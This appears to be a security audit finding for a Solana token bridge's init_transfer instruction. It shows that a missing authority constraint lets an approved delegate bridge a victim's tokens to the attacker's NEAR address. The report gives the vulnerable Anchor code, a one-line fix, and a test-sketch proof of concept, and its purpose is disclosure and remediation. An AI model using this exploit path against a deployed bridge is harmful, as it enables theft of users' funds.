### Title
Delegate-Authority Theft via Missing `token::authority = user` Constraint on `from` Account — (`solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs`)

---

### Summary

The `InitTransfer` Anchor account struct does not enforce that the `from` token account is owned by `user`. Because SPL Token's `transfer_checked` and `burn` both accept an approved delegate as the `authority`, an attacker who holds a delegate approval over a victim's token account can call `init_transfer` with `from=victim_ata` and `user=attacker`, causing the bridge to lock or burn the victim's tokens and emit a Wormhole message with `sender=attacker` and `recipient=attacker_near_addr`.

---

### Finding Description

The `from` account constraint in `InitTransfer` only validates mint and token program membership:

```rust
#[account(
    mut,
    token::mint = mint,
    token::token_program = token_program,
)]
pub from: Box<InterfaceAccount<'info, TokenAccount>>,
``` [1](#0-0) 

There is no `token::authority = user` constraint. The `user` field is only required to be a `Signer` and a system-program-owned account:

```rust
#[account(
    mut,
    owner = common.system_program.key(),
)]
pub user: Signer<'info>,
``` [2](#0-1) 

In `process`, the `transfer_checked` CPI passes `self.user` as the `authority`:

```rust
TransferChecked {
    from: self.from.to_account_info(),
    to: vault.to_account_info(),
    authority: self.user.to_account_info(),
    mint: self.mint.to_account_info(),
},
``` [3](#0-2) 

SPL Token's `transfer_checked` accepts either the token account **owner** or an approved **delegate** as the authority. If the attacker has been approved as a delegate over the victim's token account, this CPI succeeds without any bridge-level check.

The same flaw exists in the `burn` path for bridged tokens:

```rust
Burn {
    mint: self.mint.to_account_info(),
    from: self.from.to_account_info(),
    authority: self.user.to_account_info(),
},
``` [4](#0-3) 

After the token operation, the Wormhole message is serialized with `self.user.key()` as the `sender` and the attacker-controlled `payload.recipient` as the destination:

```rust
self.common.post_message(payload.serialize_for_near((
    self.common.sequence.sequence,
    self.user.key(),   // attacker's pubkey
    self.mint.key(),
))?)?;
``` [5](#0-4) 

In `serialize_for_near`, `params.1` (the attacker's pubkey) is written as the `sender` field of the cross-chain message:

```rust
// 1. sender
writer.write_all(&[SOLANA_OMNI_BRIDGE_CHAIN_ID])?;
params.1.serialize(&mut writer)?;
// 7. recipient
self.recipient.serialize(&mut writer)?;
``` [6](#0-5) 

The NEAR bridge finalizes the transfer to whatever `recipient` is encoded in the VAA — the attacker's NEAR address — with no check that the Solana-side sender was the actual owner of the tokens.

---

### Impact Explanation

**Critical — theft of bridged funds.** The victim's tokens are irreversibly locked in the vault (native path) or burned (bridged path) on Solana, and the equivalent amount is released to the attacker's NEAR address. The victim has no recourse: the Wormhole VAA is valid, the NEAR bridge will finalize it, and the tokens are gone.

---

### Likelihood Explanation

The precondition — victim has approved the attacker as a delegate — is realistic. SPL Token delegate approvals are routine in DeFi (DEX routers, lending protocols, aggregators). A malicious contract or a compromised/fake protocol that obtained a delegate approval can immediately exploit this. The attacker does not need any privileged role in the bridge itself.

---

### Recommendation

Add `token::authority = user` to the `from` account constraint:

```rust
#[account(
    mut,
    token::mint = mint,
    token::token_program = token_program,
    token::authority = user,   // <-- add this
)]
pub from: Box<InterfaceAccount<'info, TokenAccount>>,
```

This ensures Anchor rejects any `from` account whose owner is not `user`, eliminating the delegate-abuse path entirely.

---

### Proof of Concept

```rust
// localnet / mollusk test sketch
let victim = Keypair::new();
let attacker = Keypair::new();

// 1. Victim creates a token account and mints 1000 tokens into it.
let victim_ata = create_token_account(&mint, &victim.pubkey());
mint_to(&mint, &victim_ata, 1000);

// 2. Victim approves attacker as delegate for 1000 tokens
//    (simulates a prior DeFi interaction).
approve(&victim_ata, &attacker.pubkey(), &victim, 1000);

// 3. Attacker calls init_transfer:
//    - from  = victim_ata  (victim's account)
//    - user  = attacker    (signer)
//    - recipient = attacker's NEAR address
let payload = InitTransferPayload {
    amount: 1000,
    recipient: "attacker.near".to_string(),
    fee: 1,
    native_fee: 0,
    message: String::new(),
};
let result = call_init_transfer(
    &attacker,       // signer
    &victim_ata,     // from
    &vault,
    payload,
);

// 4. Assert: instruction succeeds, victim_ata balance = 0, vault balance += 1000.
assert!(result.is_ok());
assert_eq!(token_balance(&victim_ata), 0);
assert_eq!(token_balance(&vault), 1000);

// 5. Assert: Wormhole message sender = attacker.pubkey(), recipient = "attacker.near"
let wormhole_msg = parse_wormhole_message(&result);
assert_eq!(wormhole_msg.sender, attacker.pubkey());
assert_eq!(wormhole_msg.recipient, "attacker.near");
// Victim's tokens are now bridged to attacker's NEAR address.
```

### Citations

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L34-39)
```rust
    #[account(
        mut,
        token::mint = mint,
        token::token_program = token_program,
    )]
    pub from: Box<InterfaceAccount<'info, TokenAccount>>,
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L60-64)
```rust
    #[account(
        mut,
        owner = common.system_program.key(),
    )]
    pub user: Signer<'info>,
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L93-98)
```rust
                    TransferChecked {
                        from: self.from.to_account_info(),
                        to: vault.to_account_info(),
                        authority: self.user.to_account_info(),
                        mint: self.mint.to_account_info(),
                    },
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L113-117)
```rust
                    Burn {
                        mint: self.mint.to_account_info(),
                        from: self.from.to_account_info(),
                        authority: self.user.to_account_info(),
                    },
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L123-127)
```rust
        self.common.post_message(payload.serialize_for_near((
            self.common.sequence.sequence,
            self.user.key(),
            self.mint.key(),
        ))?)?;
```

**File:** solana/programs/bridge_token_factory/src/state/message/init_transfer.rs (L23-38)
```rust
        // 1. sender
        writer.write_all(&[SOLANA_OMNI_BRIDGE_CHAIN_ID])?;
        params.1.serialize(&mut writer)?;
        // 2. token
        writer.write_all(&[SOLANA_OMNI_BRIDGE_CHAIN_ID])?;
        params.2.serialize(&mut writer)?;
        // 3. nonce
        params.0.serialize(&mut writer)?;
        // 4. amount
        self.amount.serialize(&mut writer)?;
        // 5. fee
        self.fee.serialize(&mut writer)?;
        // 6. native_fee
        u128::from(self.native_fee).serialize(&mut writer)?;
        // 7. recipient
        self.recipient.serialize(&mut writer)?;
```
